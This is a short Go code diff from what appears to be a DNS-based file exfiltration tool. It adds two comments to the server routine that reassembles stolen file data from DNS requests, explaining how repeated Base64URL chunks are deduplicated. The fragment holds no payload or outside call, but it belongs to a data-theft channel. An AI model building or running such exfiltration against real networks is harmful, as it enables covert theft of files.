@@ -130,6 +130,8 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 			log.Println("Successfully exfiltrated file:", filename)
 		case DNS_FILE_DATA.String():
 			// In case DNS requests get sent multiple times.
+			// Assumption: Exfiltrated files are unlikely to have repeating sections of content
+			//             which will be encoded into the same Base64URL string.
 			if strings.Contains(string(ex.unprocessedData[machineId]), data) {
 				break
 			}
